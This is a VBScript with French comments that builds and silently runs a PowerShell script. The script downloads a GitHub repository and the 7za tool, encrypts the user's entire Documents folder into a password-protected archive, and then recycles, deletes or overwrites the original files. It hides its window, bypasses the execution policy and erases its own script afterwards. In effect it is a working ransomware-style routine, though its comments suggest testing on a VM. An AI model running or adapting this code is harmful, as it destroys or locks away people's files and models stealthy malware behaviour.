Option Explicit

Dim WshShell, FSO
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' ===== CONFIGURATION (MODIFIEZ ICI) =====
Dim repoOwner, repoName, branch
repoOwner = "Guardia-Root"      ' <-- change if needed
repoName  = "test"               ' <-- change if needed
branch    = "main"               ' <-- change if needed

Dim password
password = "SecureVM2025!"       ' <-- mot de passe de chiffrement (évitez de le stocker en clair dans le repo)

' cleanupMode: "recycle" | "delete" | "securedelete" | "keep"
Dim cleanupMode
cleanupMode = "recycle"          ' <-- choisissez le comportement après chiffrement

' ===== PATHS =====
Dim userProfile, documentsPath, outilsFolder, psScriptPath
userProfile = WshShell.ExpandEnvironmentStrings("%USERPROFILE%")
documentsPath = WshShell.SpecialFolders("MyDocuments")   ' <-- CHANGEMENT : cible le dossier Documents
outilsFolder = userProfile & "\Outils"
psScriptPath = outilsFolder & "\chiffrer_repo_and_docs_cleanup.ps1"

' Ensure tools folder exists
If Not FSO.FolderExists(outilsFolder) Then FSO.CreateFolder(outilsFolder)

' Build repo zip URL
Dim githubBaseUrl, repoZipUrl
githubBaseUrl = "https://github.com"
repoZipUrl = githubBaseUrl & "/" & repoOwner & "/" & repoName & "/archive/refs/heads/" & branch & ".zip"

' ===== PowerShell script content =====
Dim psContent
psContent = ""
psContent = psContent & "$ErrorActionPreference = 'Stop'" & vbCrLf
psContent = psContent & "$ProgressPreference = 'SilentlyContinue'" & vbCrLf
psContent = psContent & "$repoZipUrl = '" & repoZipUrl & "'" & vbCrLf
psContent = psContent & "$tools = Join-Path $env:USERPROFILE 'Outils'" & vbCrLf
psContent = psContent & "$tempZip = Join-Path $env:TEMP 'repo_download.zip'" & vbCrLf
psContent = psContent & "$extractPath = Join-Path $tools 'repo'" & vbCrLf
psContent = psContent & "$desktop = [Environment]::GetFolderPath('Desktop')" & vbCrLf
' Use MyDocuments for the folder to encrypt
psContent = psContent & "$docs = [Environment]::GetFolderPath('MyDocuments')" & vbCrLf
psContent = psContent & "$sevenZipExe = Join-Path $tools '7z\\7za.exe'" & vbCrLf
psContent = psContent & "$sevenZipArchiveUrl = 'https://www.7-zip.org/a/7za920.zip'" & vbCrLf
psContent = psContent & "$pwd = '" & Replace(password, "'", "''") & "'" & vbCrLf
psContent = psContent & "$cleanupMode = '" & cleanupMode & "'" & vbCrLf
psContent = psContent & "" & vbCrLf

psContent = psContent & "function Log($m) {" & vbCrLf
psContent = psContent & "  $log = Join-Path $desktop 'chiffrement_log.txt'" & vbCrLf
psContent = psContent & "  Add-Content -Path $log -Value (('[' + (Get-Date).ToString('yyyy-MM-dd HH:mm:ss') + '] ' + $m))" & vbCrLf
psContent = psContent & "}" & vbCrLf & vbCrLf

psContent = psContent & "try {" & vbCrLf
psContent = psContent & "  Log '=== Début script: téléchargement et chiffrement ==='" & vbCrLf
psContent = psContent & "  if (-not (Test-Path $tools)) { New-Item -ItemType Directory -Path $tools -Force | Out-Null }" & vbCrLf
psContent = psContent & "  Log ('Téléchargement: ' + $repoZipUrl)" & vbCrLf
psContent = psContent & "  Invoke-WebRequest -Uri $repoZipUrl -OutFile $tempZip -UseBasicParsing -ErrorAction Stop" & vbCrLf
psContent = psContent & "  if (Test-Path $extractPath) { Remove-Item -Recurse -Force -Path $extractPath -ErrorAction SilentlyContinue }" & vbCrLf
psContent = psContent & "  Expand-Archive -Path $tempZip -DestinationPath $extractPath -Force" & vbCrLf
psContent = psContent & "  Remove-Item -Path $tempZip -Force -ErrorAction SilentlyContinue" & vbCrLf
psContent = psContent & "  Log 'Repo extrait dans: ' + $extractPath" & vbCrLf
psContent = psContent & "" & vbCrLf

psContent = psContent & "  if (-not (Test-Path $docs)) {" & vbCrLf
psContent = psContent & "    Log 'ERREUR: dossier Documents introuvable: ' + $docs" & vbCrLf
psContent = psContent & "    exit 2" & vbCrLf
psContent = psContent & "  }" & vbCrLf
psContent = psContent & "  Log 'Dossier Documents trouvé: ' + $docs" & vbCrLf & vbCrLf

psContent = psContent & "  # Ensure 7za exists" & vbCrLf
psContent = psContent & "  if (-not (Test-Path $sevenZipExe)) {" & vbCrLf
psContent = psContent & "    Log '7za introuvable, téléchargement...'" & vbCrLf
psContent = psContent & "    $zzip = Join-Path $env:TEMP '7za.zip'" & vbCrLf
psContent = psContent & "    Invoke-WebRequest -Uri $sevenZipArchiveUrl -OutFile $zzip -UseBasicParsing -ErrorAction Stop" & vbCrLf
psContent = psContent & "    $sevenFolder = Join-Path $tools '7z'" & vbCrLf
psContent = psContent & "    if (-not (Test-Path $sevenFolder)) { New-Item -ItemType Directory -Path $sevenFolder -Force | Out-Null }" & vbCrLf
psContent = psContent & "    try { Expand-Archive -Path $zzip -DestinationPath $sevenFolder -Force } catch { Log 'Expand-Archive failed: ' + $_.Exception.Message }" & vbCrLf
psContent = psContent & "    Remove-Item -Path $zzip -Force -ErrorAction SilentlyContinue" & vbCrLf
psContent = psContent & "    $found = Get-ChildItem -Path $sevenFolder -Recurse -Filter '7za.exe' -ErrorAction SilentlyContinue | Select-Object -First 1" & vbCrLf
psContent = psContent & "    if ($found) { $sevenZipExe = $found.FullName; Log '7za trouvé: ' + $sevenZipExe } else { Log 'ERREUR: 7za non trouvé après extraction'; exit 3 }" & vbCrLf
psContent = psContent & "  } else { Log '7za déjà présent: ' + $sevenZipExe }" & vbCrLf & vbCrLf

psContent = psContent & "  $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'" & vbCrLf
psContent = psContent & "  $outArchive = Join-Path $desktop ('Documents_Encrypted_' + $timestamp + '.7z')" & vbCrLf
psContent = psContent & "  Log ('Chiffrement: création de ' + $outArchive)" & vbCrLf
psContent = psContent & "  $args = @('a','-t7z','-mx=9','-mhe=on', ('-p' + $pwd), $outArchive, (Join-Path $docs '*'))" & vbCrLf
psContent = psContent & "  & $sevenZipExe $args" & vbCrLf
psContent = psContent & "  if (Test-Path $outArchive) { Log 'Archive créée: ' + $outArchive } else { Log 'ERREUR: archive non créée'; exit 4 }" & vbCrLf
psContent = psContent & "" & vbCrLf

psContent = psContent & "  # Cleanup original folder according to mode" & vbCrLf
psContent = psContent & "  Log ('Cleanup mode: ' + $cleanupMode)" & vbCrLf
psContent = psContent & "  switch ($cleanupMode) {" & vbCrLf

' recycle -> send to Recycle Bin using Shell.Application InvokeVerb('delete')
psContent = psContent & "    'recycle' {" & vbCrLf
psContent = psContent & "      try {" & vbCrLf
psContent = psContent & "        $shell = New-Object -ComObject Shell.Application" & vbCrLf
psContent = psContent & "        $parent = (Get-Item $docs).Parent.FullName" & vbCrLf
psContent = psContent & "        $folder = $shell.Namespace($parent)" & vbCrLf
psContent = psContent & "        $item = $folder.ParseName((Get-Item $docs).Name)" & vbCrLf
psContent = psContent & "        $item.InvokeVerb('delete')" & vbCrLf
psContent = psContent & "        Log 'Envoyé à la Corbeille: ' + $docs" & vbCrLf
psContent = psContent & "      } catch { Log 'Erreur Recycle: ' + $_.Exception.Message }" & vbCrLf
psContent = psContent & "      break" & vbCrLf
psContent = psContent & "    }" & vbCrLf

' delete -> permanent remove
psContent = psContent & "    'delete' {" & vbCrLf
psContent = psContent & "      try { Remove-Item -Path $docs -Recurse -Force -ErrorAction Stop; Log 'Supprimé définitivement: ' + $docs } catch { Log 'Erreur delete: ' + $_.Exception.Message }" & vbCrLf
psContent = psContent & "      break" & vbCrLf
psContent = psContent & "    }" & vbCrLf

' securedelete -> simple overwrite then delete (basic, not guaranteed secure on all FS)
psContent = psContent & "    'securedelete' {" & vbCrLf
psContent = psContent & "      try {" & vbCrLf
psContent = psContent & "        Log 'Secure delete: écrasement des fichiers (approche basique)'" & vbCrLf
psContent = psContent & "        Get-ChildItem -Path $docs -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {" & vbCrLf
psContent = psContent & "          try {" & vbCrLf
psContent = psContent & "            $len = $_.Length" & vbCrLf
psContent = psContent & "            $rnd = New-Object System.Random" & vbCrLf
psContent = psContent & "            $bytes = New-Object byte[] $len" & vbCrLf
psContent = psContent & "            $rnd.NextBytes($bytes)" & vbCrLf
psContent = psContent & "            [System.IO.File]::WriteAllBytes($_.FullName, $bytes)" & vbCrLf
psContent = psContent & "          } catch { Log 'Overwrite error: ' + $_.FullName + ' - ' + $_.Exception.Message }" & vbCrLf
psContent = psContent & "        }" & vbCrLf
psContent = psContent & "        Remove-Item -Path $docs -Recurse -Force -ErrorAction Stop; Log 'Secure delete terminé: ' + $docs" & vbCrLf
psContent = psContent & "      } catch { Log 'Erreur securedelete: ' + $_.Exception.Message }" & vbCrLf
psContent = psContent & "      break" & vbCrLf
psContent = psContent & "    }" & vbCrLf

psContent = psContent & "    default { Log 'No cleanup (keep original)'; break }" & vbCrLf
psContent = psContent & "  }" & vbCrLf

psContent = psContent & "  Log '=== Fin script successful ==='" & vbCrLf
psContent = psContent & "  exit 0" & vbCrLf
psContent = psContent & "} catch {" & vbCrLf
psContent = psContent & "  Log 'Exception: ' + $_.Exception.Message" & vbCrLf
psContent = psContent & "  exit 1" & vbCrLf
psContent = psContent & "}" & vbCrLf

' ====== Write PS1 to disk ======
Dim psFile
Set psFile = FSO.CreateTextFile(psScriptPath, True)
psFile.Write psContent
psFile.Close

' ====== Execute PowerShell script hidden and wait ======
Dim ret, cmd
cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """"
ret = WshShell.Run(cmd, 0, True)  ' wait for completion

' ====== Clean up PS1 (optional) ======
On Error Resume Next
If FSO.FileExists(psScriptPath) Then FSO.DeleteFile(psScriptPath)
On Error GoTo 0

' ====== Notify user ======
If ret = 0 Then
    MsgBox "✅ Opération terminée. Vérifiez le fichier chiffré sur le bureau et le log (chiffrement_log.txt).", vbInformation, "Terminé"
Else
    MsgBox "❌ Le script a rencontré une erreur (code " & ret & "). Consultez 'chiffrement_log.txt' sur le bureau pour les détails.", vbCritical, "Erreur"
End If

' ====== REMARQUES DE SÉCURITÉ ======
' - securedelete: l'écrasement implémenté est basique (écrit des bytes aléatoires), il peut ne pas garantir une suppression irrécupérable sur tous les systèmes de fichiers
' - Pour un effacement sécurisé certifié, utilisez un outil dédié (sdelete from Sysinternals) ou chiffrez d'abord, puis supprimez et exécutez un outil d'écrasement
' - Evitez de stocker le mot de passe en clair dans le repo. Préférez lire le mot de passe depuis un fichier protégé sur un serveur ou demander à l'utilisateur.
' - Testez d'abord en mode cleanupMode = "keep" ou "recycle" sur une VM de test.
